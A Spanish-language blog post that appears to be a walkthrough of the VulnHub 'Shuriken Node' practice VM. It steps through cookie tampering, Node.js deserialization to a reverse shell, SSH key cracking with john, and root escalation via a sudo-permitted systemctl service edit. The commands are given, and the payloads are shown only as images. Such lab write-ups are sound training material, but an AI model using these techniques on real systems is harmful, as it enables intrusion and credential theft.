---
layout: post
title: "Shuriken Node"
date: 2024-05-25 13:25:23
category: vulnhub
vm: vulnhub
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/vulnhub/vulnhub.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Shuriken Node </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
  <tr> <td><strong><a href="https://www.vulnhub.com/entry/shuriken-node,628/" target="_blank"> Descarga</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/vulnhub/ShurikenNode/host.png){:.margin}

**1\.** Escaneo de dispositivos en la red.

`sudo arp-scan -l`

![img](/notas/public/img/vulnhub/ShurikenNode/arp.png){:.margin}

**2\.** Reviso los puertos abiertos y servicios disponibles en los puertos.

`sudo nmap -p- --open -sCV -T5 --min-rate=5000 192.168.1.9 -Pn -n`

![img](/notas/public/img/vulnhub/ShurikenNode/nmap.png){:.margin}

**3\.** Revisando la Web que corre por el 8080.

`http://192.168.1.127:8080`

![img](/notas/public/img/vulnhub/ShurikenNode/8080.png){:.margin}

**4\.** haciendo fuzzing encuentro directorios, pero no nos permite visualizarlos.

`gobuster dir -u http://192.168.1.9:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js -q`

![img](/notas/public/img/vulnhub/ShurikenNode/gobuster.png){:.margin}
![img](/notas/public/img/vulnhub/ShurikenNode/dirfail.png){:.margin}

**5\.** Copio mi cookie de session para ver su valor.

![img](/notas/public/img/vulnhub/ShurikenNode/inspect.png){:.margin}

**6\.** Voy a [Cyberchef](https://gchq.github.io/CyberChef/) para tratar la data.

![img](/notas/public/img/vulnhub/ShurikenNode/cyberchef.png){:.margin}
![img](/notas/public/img/vulnhub/ShurikenNode/cyberchef2.png){:.margin}

**7\.** Reemplazo la cookie y actualizo la pagina, me convierto en administrador.

![img](/notas/public/img/vulnhub/ShurikenNode/cookiereplace.png){:.margin}

_\- Veo que lo unico que cambia es el usuario asi que mucho no se puede hacer._

**8\.** Ingreso data al azar en la cookie y al recargarla veo que deserializa.

![img](/notas/public/img/vulnhub/ShurikenNode/cookieerror.png){:.margin}

**9\.** La forma de explotar lo tenemos a detalle en esta pagina [opsecx](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

_9.1- Instalo el modulo necesario; la esta funcion nos devuelve una cadena serializada, esto lo guardo en un archivo_

`npm install node-serialize`

`node serialize.js`

![img](/notas/public/img/vulnhub/ShurikenNode/serialize.png){:.margin}

_9.1- Descargo esta herramienta [nodejsshell](https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py) para generar una reverse shell codificado_

`wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py -q`

_9.2- Al ejecutar me da errores, tenemos que modificar un poco el codigo_

`python3 nodejsshell.py 192.168.1.9 443`

_\- En todos los print le agregamos parentesis, 'print ("ejemplo")'_

![img](/notas/public/img/vulnhub/ShurikenNode/nodejsshellerror.png){:.margin}

_\- Copiamos el payload generado_

![img](/notas/public/img/vulnhub/ShurikenNode/payload.png){:.margin}

_\- Modificamos la cadena serializada para agregar nuestro payload y lo pasamos a base64_

![img](/notas/public/img/vulnhub/ShurikenNode/serializeok.png){:.margin}
![img](/notas/public/img/vulnhub/ShurikenNode/base64.png){:.margin}

**10\.** Me pongo en escucha y pego el base64 en la cookie ; si recargamos la pagina obtendremos el acceso.

`sudo nc -nlvp 443`

![img](/notas/public/img/vulnhub/ShurikenNode/newcookie.png){:.margin}
![img](/notas/public/img/vulnhub/ShurikenNode/nc.png){:.margin}

**11\.** Tratamiento de la tty.

`script /dev/null -c bash`

   `ctrl+z`

`stty raw -echo;fg`

   `reset xterm`

`export TERM=xterm SHELL=/bin/bash`

![img](/notas/public/img/vulnhub/ShurikenNode/tty.png){:.margin}

**12\.** Tenemos 3 usuarios disponibles en el sistema.

`cat /etc/passwd | grep bash`

![img](/notas/public/img/vulnhub/ShurikenNode/catpasswd.png){:.margin}

**13\.** Encontre un backup de ssh que contiene una clave privada encriptada.

`cd /var/backups`

`ls -l`

`cp ssh-backup.zip /tmp`

`cd /tmp`

`unzip ssh-backup.zip`

`cat id_rsa`

![img](/notas/public/img/vulnhub/ShurikenNode/backupls.png){:.margin}
![img](/notas/public/img/vulnhub/ShurikenNode/idrsaencrypted.png){:.margin}

**14\.** Rompiendo la id_rsa encriptada.

_14.1- Guardo en un fichero el contenido del id_rsa_

`nano key`

![img](/notas/public/img/vulnhub/ShurikenNode/nano.png){:.margin}

_14.1- Generamos el passphrase con john_

`ssh2john key> pass`

`john --wordlist=/usr/share/wordlists/rockyou.txt pass`

![img](/notas/public/img/vulnhub/ShurikenNode/john.png){:.margin}

**15\.** Nos conectamos por ssh con el usuario serv-adm.

`ssh -id id_rsa serv-adm@192.168.1.9`

![img](/notas/public/img/vulnhub/ShurikenNode/sshserv.png){:.margin}

**16\.** Puedo ejecutar el binario systemctl como root ,ademas puedo controlar unos servicios.

`sudo -l`

`locate shuriken-auto.timer`

`cat /etc/systemd/system/shuriken-auto.timer`

![img](/notas/public/img/vulnhub/ShurikenNode/timer1.png){:.margin}

_\- Reviso este otro servicio, veo que ejecuta un binario_

`locate shuriken-job.service`

`cat /etc/systemd/sytem/shuriken-job.service`

![img](/notas/public/img/vulnhub/ShurikenNode/timer2.png){:.margin}

**17\.** Escalada de privilegios.

`nano `

`nano /etc/systemd/system/shuriken-job.service`

`sudo /bin/systemctl stop shuriken-auto.timer`

`sudo /bin/systemctl start shuriken-auto.timer`

![img](/notas/public/img/vulnhub/ShurikenNode/reverse.png){:.margin}

![img](/notas/public/img/vulnhub/ShurikenNode/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>
